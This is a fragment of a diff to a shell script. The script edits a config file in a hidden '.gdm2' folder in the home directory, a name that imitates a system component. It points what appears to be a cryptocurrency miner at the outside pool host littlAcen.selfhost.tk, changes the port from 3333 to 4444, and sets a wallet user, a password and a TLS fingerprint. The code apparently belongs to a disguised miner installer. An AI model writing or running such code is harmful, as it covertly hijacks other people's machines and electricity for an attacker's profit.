@@ -230,7 +230,7 @@ if [ ! -z $EMAIL ]; then
   PASS="$PASS:$EMAIL"
 fi
 
-sed -i 's/"url": *"[^"]*",/"url": "littlAcen.selfhost.tk:3333",/' $HOME/.gdm2/config.json
+sed -i 's/"url": *"[^"]*",/"url": "littlAcen.selfhost.tk:4444",/' $HOME/.gdm2/config.json
 sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $HOME/.gdm2/config.json
 sed -i 's/"pass": *"[^"]*",/"pass": "hv",/' $HOME/.gdm2/config.json
 sed -i 's/"tls-fingerprint": null,/"tls-fingerprint": "0763bdd689bf1940a75eb46d209704dde4dcc26dbdfa2aefd050c79fee3377ee",/' $HOME/.gdm2/config.json
